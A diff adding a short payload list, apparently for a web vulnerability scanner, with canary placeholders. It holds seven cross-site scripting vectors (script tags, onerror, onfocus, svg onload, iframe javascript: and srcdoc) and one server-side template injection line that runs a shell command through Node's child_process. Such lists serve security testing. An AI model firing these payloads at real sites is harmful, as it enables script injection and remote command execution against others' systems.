@@ -1,0 +1,8 @@
+<script>{canary}</script>
+"><img src=x onerror=alert('{canary}')>
+" tabindex=1 onfocus=alert('{canary}') x="
+`-alert(1)}//
+'"><svg/onload=alert('{canary}')>
+"><iframe src=javascript:alert('{canary}')>
+<iframe/srcdoc="<script>alert('{canary}')</script>">
+${global.process.mainModule.require('child_process').execSync('id')}
